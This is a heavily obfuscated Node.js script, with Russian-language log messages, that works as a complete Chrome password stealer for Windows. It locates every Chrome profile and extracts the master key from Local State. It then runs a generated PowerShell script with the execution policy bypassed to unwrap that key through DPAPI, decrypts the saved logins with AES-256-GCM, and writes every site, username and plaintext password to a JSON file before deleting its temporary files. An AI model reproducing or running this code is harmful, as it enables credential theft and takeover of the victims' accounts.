const _0x68dddb=_0x242e;(function(_0x52f9a2,_0x56e325){const _0x1bea88=_0x242e,_0x10dbec=_0x52f9a2();while(!![]){try{const _0x15479f=parseInt(_0x1bea88(0x157))/0x1*(-parseInt(_0x1bea88(0x164))/0x2)+parseInt(_0x1bea88(0x10e))/0x3*(parseInt(_0x1bea88(0x169))/0x4)+-parseInt(_0x1bea88(0x124))/0x5*(-parseInt(_0x1bea88(0x144))/0x6)+-parseInt(_0x1bea88(0x10b))/0x7*(parseInt(_0x1bea88(0x173))/0x8)+-parseInt(_0x1bea88(0x11f))/0x9*(parseInt(_0x1bea88(0x176))/0xa)+-parseInt(_0x1bea88(0x10f))/0xb*(-parseInt(_0x1bea88(0x143))/0xc)+parseInt(_0x1bea88(0x175))/0xd*(-parseInt(_0x1bea88(0x154))/0xe);if(_0x15479f===_0x56e325)break;else _0x10dbec['push'](_0x10dbec['shift']());}catch(_0x213940){_0x10dbec['push'](_0x10dbec['shift']());}}}(_0x79bd,0xeb458));function _0x79bd(){const _0xf81830=['message','replace','crypto','hex','469NNDEWZ','update','random','159KyAFHP','2057ulMBPP','unlinkSync','Local','toISOString','readFileSync','close','\x20скопирован\x20во\x20временную\x20директорию','_decrypted','promisify','username_value','Критическая\x20ошибка:','decrypt_chrome_key_','PRAGMA\x20table_info(logins)','tmpdir','slice','\x0aВсе\x20расшифрованные\x20пароли\x20(','489150wboaxD','warn','Необработанная\x20ошибка:','.json','Файл\x20Local\x20State\x20не\x20найден\x20по\x20пути:\x20','342445NEhZuK','User\x20Data','\x20профилей\x20с\x20Login\x20Data',')\x20сохранены\x20в\x20файл:\x20','Local\x20State','join','util','error','startsWith','Ключ\x20шифрования\x20успешно\x20получен','Не\x20удалось\x20найти\x20encrypted_key\x20в\x20Local\x20State','toString','base64','=====\x20Расшифровка\x20паролей\x20Chrome\x20из\x20всех\x20профилей\x20=====','concat','Не\x20удалось\x20удалить\x20временный\x20файл\x20для\x20профиля\x20','\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20$decrypted\x20=\x20[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes,\x20$null,\x20\x27CurrentUser\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20[System.IO.File]::WriteAllBytes(\x27','createDecipheriv','Найдено\x20','Не\x20удалось\x20создать\x20файл\x20с\x20расшифрованным\x20ключом','Не\x20найдено\x20профилей\x20с\x20файлами\x20Login\x20Data','Ошибка\x20расшифровки\x20пароля\x20для\x20','all','copyFileSync','В\x20таблице\x20logins\x20профиля\x20','Директория\x20','powershell\x20-ExecutionPolicy\x20Bypass\x20-File\x20\x22','aes-256-gcm','exit','date_last_used','bind','97596YylANe','138vEuFxC','AppData','from','\x20удален','times_used','child_process','\x20записей\x20паролей\x20в\x20профиле\x20','path','\x20не\x20найдена','chrome_all_profiles_passwords_','readdirSync','Ошибка\x20при\x20получении\x20ключа\x20шифрования:','Ошибка\x20расшифровки\x20AES-GCM:\x20','password_value','Login\x20Data','final','669466rrDxYX','\x0aОбработка\x20профиля:\x20','sort','174041qluQgJ','Chrome','existsSync','catch','utf8','date_created','Временный\x20файл\x20для\x20профиля\x20','encrypted_key','[Ошибка\x20расшифровки:\x20','Ошибка\x20при\x20расшифровке\x20значения:\x20','name','.ps1','writeFileSync','2MUGKNw','_decrypted\x27,\x20$decrypted);\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22Decryption\x20successful\x22;\x0a\x20\x20\x20\x20}\x20catch\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Error\x20\x22Decryption\x20error:\x20$_\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20exit\x201;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20','\x0a\x20\x20\x20\x20Add-Type\x20-AssemblyName\x20System.Security;\x0a\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$encryptedBytes\x20=\x20[System.IO.File]::ReadAllBytes(\x27','origin_url','log','2444IKPEPK','chrome_login_data_temp_','statSync','os_crypt','parse','user','stringify','action_url','filter','Database','98584UxHpWb','substring','169fOoyxc','100INDupj','[Ошибка:\x20','\x20в\x20профиле\x20','length','isDirectory'];_0x79bd=function(){return _0xf81830;};return _0x79bd();}function _0x242e(_0x511f65,_0x150cba){const _0x79bd19=_0x79bd();return _0x242e=function(_0x242e81,_0x334525){_0x242e81=_0x242e81-0x106;let _0x47d33a=_0x79bd19[_0x242e81];return _0x47d33a;},_0x242e(_0x511f65,_0x150cba);}const fs=require('fs'),path=require(_0x68dddb(0x14b)),os=require('os'),crypto=require(_0x68dddb(0x109)),{execSync}=require(_0x68dddb(0x149)),sqlite3=require('sqlite3')['verbose'](),util=require(_0x68dddb(0x12a)),CHROME_USER_DATA_PATH=path['join']('C:','Users',_0x68dddb(0x16e),_0x68dddb(0x145),_0x68dddb(0x111),'Google',_0x68dddb(0x158),_0x68dddb(0x125));function findChromeProfiles(){const _0x29e20e=_0x68dddb;try{if(!fs['existsSync'](CHROME_USER_DATA_PATH))throw new Error(_0x29e20e(0x13d)+CHROME_USER_DATA_PATH+_0x29e20e(0x14c));const _0x289fc3=fs[_0x29e20e(0x14e)](CHROME_USER_DATA_PATH),_0x3ab33f=_0x289fc3['filter'](_0x3df980=>{const _0x4852f5=_0x29e20e,_0x368ac0=path['join'](CHROME_USER_DATA_PATH,_0x3df980);return fs[_0x4852f5(0x16b)](_0x368ac0)[_0x4852f5(0x106)]()&&(_0x3df980==='Default'||_0x3df980[_0x4852f5(0x12c)]('Profile\x20'));}),_0x32b9e9=_0x3ab33f[_0x29e20e(0x171)](_0x9c28ad=>{const _0x3cdcd4=_0x29e20e,_0x49d2a8=path[_0x3cdcd4(0x129)](CHROME_USER_DATA_PATH,_0x9c28ad,_0x3cdcd4(0x152));return fs[_0x3cdcd4(0x159)](_0x49d2a8);});return console['log'](_0x29e20e(0x136)+_0x32b9e9[_0x29e20e(0x179)]+_0x29e20e(0x126)),_0x32b9e9;}catch(_0x1c7eca){return console[_0x29e20e(0x12b)]('Ошибка\x20при\x20поиске\x20профилей\x20Chrome:',_0x1c7eca[_0x29e20e(0x107)]),[];}}function getEncryptionKey(){const _0x159aa0=_0x68dddb;try{const _0x3d56ba=path[_0x159aa0(0x129)](CHROME_USER_DATA_PATH,_0x159aa0(0x128));if(!fs['existsSync'](_0x3d56ba))throw new Error(_0x159aa0(0x123)+_0x3d56ba);const _0x3c51d6=fs[_0x159aa0(0x113)](_0x3d56ba,_0x159aa0(0x15b)),_0x5b065d=JSON[_0x159aa0(0x16d)](_0x3c51d6);if(!_0x5b065d[_0x159aa0(0x16c)]||!_0x5b065d[_0x159aa0(0x16c)][_0x159aa0(0x15e)])throw new Error(_0x159aa0(0x12e));const _0x541009=Buffer['from'](_0x5b065d[_0x159aa0(0x16c)][_0x159aa0(0x15e)],_0x159aa0(0x130)),_0x59eada=_0x541009['slice'](0x5),_0x1d9a56=os[_0x159aa0(0x11c)](),_0x45f6fe=path[_0x159aa0(0x129)](_0x1d9a56,'chrome_key_encrypted_'+Math[_0x159aa0(0x10d)]()[_0x159aa0(0x12f)](0x24)[_0x159aa0(0x174)](0x2,0x8));fs[_0x159aa0(0x163)](_0x45f6fe,_0x59eada);const _0x1e2704=_0x159aa0(0x166)+_0x45f6fe[_0x159aa0(0x108)](/\\/g,'\x5c\x5c')+_0x159aa0(0x134)+_0x45f6fe+_0x159aa0(0x165),_0x5eec12=path[_0x159aa0(0x129)](_0x1d9a56,_0x159aa0(0x11a)+Math[_0x159aa0(0x10d)]()[_0x159aa0(0x12f)](0x24)[_0x159aa0(0x174)](0x2,0x8)+_0x159aa0(0x162));fs[_0x159aa0(0x163)](_0x5eec12,_0x1e2704);try{execSync(_0x159aa0(0x13e)+_0x5eec12+'\x22');}catch(_0x4e101a){console[_0x159aa0(0x12b)]('PowerShell\x20error:',_0x4e101a[_0x159aa0(0x107)]);throw new Error('Ошибка\x20выполнения\x20PowerShell\x20скрипта');}const _0x4b5248=_0x45f6fe+_0x159aa0(0x116);if(!fs[_0x159aa0(0x159)](_0x4b5248))throw new Error(_0x159aa0(0x137));const _0x5a0dd4=fs['readFileSync'](_0x4b5248);try{fs[_0x159aa0(0x110)](_0x45f6fe),fs['unlinkSync'](_0x4b5248),fs[_0x159aa0(0x110)](_0x5eec12);}catch(_0x1a7b72){console[_0x159aa0(0x120)]('Предупреждение:\x20не\x20удалось\x20удалить\x20временные\x20файлы');}return console['log'](_0x159aa0(0x12d)),_0x5a0dd4;}catch(_0x1f02de){console[_0x159aa0(0x12b)](_0x159aa0(0x14f),_0x1f02de[_0x159aa0(0x107)]);throw _0x1f02de;}}function decryptValue(_0x2e3be1,_0x2f2d21){const _0x3a9fed=_0x68dddb;try{if(!_0x2e3be1||_0x2e3be1['length']===0x0)return'';const _0x1d250f=_0x2e3be1[_0x3a9fed(0x179)]>0x3&&_0x2e3be1[0x0]===0x76&&_0x2e3be1[0x1]===0x31&&_0x2e3be1[0x2]===0x30;if(_0x1d250f)try{const _0x423d57=_0x2e3be1[_0x3a9fed(0x11d)](0x3,0xf),_0x28d0a9=_0x2e3be1[_0x3a9fed(0x11d)](0xf,-0x10),_0xfd875e=_0x2e3be1[_0x3a9fed(0x11d)](-0x10),_0xa07760=crypto[_0x3a9fed(0x135)](_0x3a9fed(0x13f),_0x2f2d21,_0x423d57);_0xa07760['setAuthTag'](_0xfd875e);let _0x40945b=_0xa07760[_0x3a9fed(0x10c)](_0x28d0a9);return _0x40945b=Buffer[_0x3a9fed(0x132)]([_0x40945b,_0xa07760[_0x3a9fed(0x153)]()]),_0x40945b[_0x3a9fed(0x12f)]('utf8');}catch(_0x29d8e3){return console[_0x3a9fed(0x12b)](_0x3a9fed(0x150)+_0x29d8e3['message']),_0x3a9fed(0x15f)+_0x29d8e3[_0x3a9fed(0x107)]+']';}else return'[Encrypted-Legacy:\x20'+_0x2e3be1[_0x3a9fed(0x12f)](_0x3a9fed(0x10a))['substring'](0x0,0xa)+'...]';}catch(_0xd7648f){return console[_0x3a9fed(0x12b)](_0x3a9fed(0x160)+_0xd7648f[_0x3a9fed(0x107)]),_0x3a9fed(0x177)+_0xd7648f[_0x3a9fed(0x107)]+']';}}function chromeTimeToDate(_0x124e86){const _0xfcdd81=_0x68dddb;if(!_0x124e86)return null;const _0x405d27=Number(_0x124e86),_0x1cd062=Math['floor'](_0x405d27/0x3e8)-0xa9730b66800;if(_0x1cd062<0x0)return null;return new Date(_0x1cd062)[_0xfcdd81(0x112)]();}async function decryptProfilePasswords(_0x3035f8,_0x37a549){const _0x34ecc6=_0x68dddb,_0x1b6dd1=path[_0x34ecc6(0x129)](CHROME_USER_DATA_PATH,_0x3035f8,_0x34ecc6(0x152));if(!fs[_0x34ecc6(0x159)](_0x1b6dd1))return console[_0x34ecc6(0x12b)]('Файл\x20Login\x20Data\x20не\x20найден\x20для\x20профиля\x20'+_0x3035f8),[];const _0x3d1978=os[_0x34ecc6(0x11c)](),_0x481669=path['join'](_0x3d1978,_0x34ecc6(0x16a)+Math[_0x34ecc6(0x10d)]()['toString'](0x24)[_0x34ecc6(0x174)](0x2,0x8));try{fs[_0x34ecc6(0x13b)](_0x1b6dd1,_0x481669),console[_0x34ecc6(0x168)]('Файл\x20Login\x20Data\x20для\x20профиля\x20'+_0x3035f8+_0x34ecc6(0x115));const _0x50489c=new sqlite3[(_0x34ecc6(0x172))](_0x481669),_0x43d5b5=util[_0x34ecc6(0x117)](_0x50489c[_0x34ecc6(0x13a)][_0x34ecc6(0x142)](_0x50489c)),_0x5c06d6=util[_0x34ecc6(0x117)](_0x50489c[_0x34ecc6(0x114)][_0x34ecc6(0x142)](_0x50489c)),_0x2603bf=await _0x43d5b5(_0x34ecc6(0x11b)),_0x3418a8=_0x2603bf['some'](_0x1aa049=>_0x1aa049['name']===_0x34ecc6(0x118)),_0x248085=_0x2603bf['some'](_0x2cbd10=>_0x2cbd10[_0x34ecc6(0x161)]===_0x34ecc6(0x151));if(!_0x3418a8||!_0x248085)throw new Error(_0x34ecc6(0x13c)+_0x3035f8+'\x20отсутствуют\x20необходимые\x20столбцы');const _0x22f189='\x0a\x20\x20\x20\x20\x20\x20SELECT\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20origin_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20action_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20username_value,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20password_value,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_created,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used,\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x0a\x20\x20\x20\x20\x20\x20FROM\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20logins\x0a\x20\x20\x20\x20\x20\x20ORDER\x20BY\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x20DESC,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used\x20DESC\x0a\x20\x20\x20\x20',_0x734c92=await _0x43d5b5(_0x22f189);console[_0x34ecc6(0x168)](_0x34ecc6(0x136)+_0x734c92[_0x34ecc6(0x179)]+_0x34ecc6(0x14a)+_0x3035f8);const _0x29b314=_0x734c92['map'](_0x1cf4cf=>{const _0x2f76de=_0x34ecc6;try{const _0x4cd406=Buffer[_0x2f76de(0x146)](_0x1cf4cf[_0x2f76de(0x151)]),_0x1d9ff9=decryptValue(_0x4cd406,_0x37a549);return{'profile':_0x3035f8,'origin_url':_0x1cf4cf[_0x2f76de(0x167)],'action_url':_0x1cf4cf[_0x2f76de(0x170)],'username':_0x1cf4cf[_0x2f76de(0x118)],'password':_0x1d9ff9,'date_created':chromeTimeToDate(_0x1cf4cf[_0x2f76de(0x15c)]),'date_last_used':chromeTimeToDate(_0x1cf4cf['date_last_used']),'times_used':_0x1cf4cf[_0x2f76de(0x148)]};}catch(_0x243a80){return console[_0x2f76de(0x12b)](_0x2f76de(0x139)+_0x1cf4cf['origin_url']+_0x2f76de(0x178)+_0x3035f8+':',_0x243a80[_0x2f76de(0x107)]),{'profile':_0x3035f8,'origin_url':_0x1cf4cf[_0x2f76de(0x167)],'action_url':_0x1cf4cf[_0x2f76de(0x170)],'username':_0x1cf4cf[_0x2f76de(0x118)],'password':'[Ошибка\x20расшифровки:\x20'+_0x243a80['message']+']','date_created':chromeTimeToDate(_0x1cf4cf[_0x2f76de(0x15c)]),'date_last_used':chromeTimeToDate(_0x1cf4cf[_0x2f76de(0x141)]),'times_used':_0x1cf4cf[_0x2f76de(0x148)]};}});await _0x5c06d6();try{fs['unlinkSync'](_0x481669),console[_0x34ecc6(0x168)](_0x34ecc6(0x15d)+_0x3035f8+_0x34ecc6(0x147));}catch(_0x589f07){console[_0x34ecc6(0x120)](_0x34ecc6(0x133)+_0x3035f8+':\x20'+_0x589f07[_0x34ecc6(0x107)]);}return _0x29b314;}catch(_0x220d93){console[_0x34ecc6(0x12b)]('Ошибка\x20при\x20расшифровке\x20паролей\x20профиля\x20'+_0x3035f8+':',_0x220d93[_0x34ecc6(0x107)]);if(fs[_0x34ecc6(0x159)](_0x481669))try{fs[_0x34ecc6(0x110)](_0x481669);}catch(_0x276000){console[_0x34ecc6(0x120)](_0x34ecc6(0x133)+_0x3035f8+':\x20'+_0x276000[_0x34ecc6(0x107)]);}return[];}}async function decryptAllProfilesPasswords(){const _0x213fba=_0x68dddb;try{const _0x4ad47c=findChromeProfiles();if(_0x4ad47c['length']===0x0)return console[_0x213fba(0x168)](_0x213fba(0x138)),null;const _0x425723=getEncryptionKey();let _0x402254=[];for(const _0x4ac2d5 of _0x4ad47c){console[_0x213fba(0x168)](_0x213fba(0x155)+_0x4ac2d5);const _0x6ae762=await decryptProfilePasswords(_0x4ac2d5,_0x425723);_0x402254=_0x402254[_0x213fba(0x132)](_0x6ae762);}_0x402254[_0x213fba(0x156)]((_0xe9e7a6,_0x4b2f6c)=>{const _0x19bbed=_0x213fba;if(_0x4b2f6c[_0x19bbed(0x148)]!==_0xe9e7a6['times_used'])return _0x4b2f6c[_0x19bbed(0x148)]-_0xe9e7a6[_0x19bbed(0x148)];if(_0xe9e7a6[_0x19bbed(0x141)]&&_0x4b2f6c[_0x19bbed(0x141)])return new Date(_0x4b2f6c['date_last_used'])-new Date(_0xe9e7a6[_0x19bbed(0x141)]);return 0x0;});const _0x5439f5=_0x213fba(0x14d)+new Date()[_0x213fba(0x112)]()['replace'](/[:.]/g,'-')+_0x213fba(0x122);return fs['writeFileSync'](_0x5439f5,JSON[_0x213fba(0x16f)](_0x402254,null,0x2),_0x213fba(0x15b)),console[_0x213fba(0x168)](_0x213fba(0x11e)+_0x402254[_0x213fba(0x179)]+_0x213fba(0x127)+_0x5439f5),{'count':_0x402254[_0x213fba(0x179)],'outputPath':_0x5439f5,'profiles':_0x4ad47c};}catch(_0x3da6b6){console[_0x213fba(0x12b)]('Ошибка\x20при\x20расшифровке\x20паролей\x20из\x20всех\x20профилей:',_0x3da6b6[_0x213fba(0x107)]);throw _0x3da6b6;}}async function main(){const _0x3df56e=_0x68dddb;try{console[_0x3df56e(0x168)](_0x3df56e(0x131)),await decryptAllProfilesPasswords(),console[_0x3df56e(0x168)]('\x0a=====\x20Расшифровка\x20завершена\x20=====');}catch(_0x14c1e7){console['error'](_0x3df56e(0x119),_0x14c1e7[_0x3df56e(0x107)]),process[_0x3df56e(0x140)](0x1);}}main()[_0x68dddb(0x15a)](_0x44cb0f=>{const _0xcc8661=_0x68dddb;console[_0xcc8661(0x12b)](_0xcc8661(0x121),_0x44cb0f),process[_0xcc8661(0x140)](0x1);});
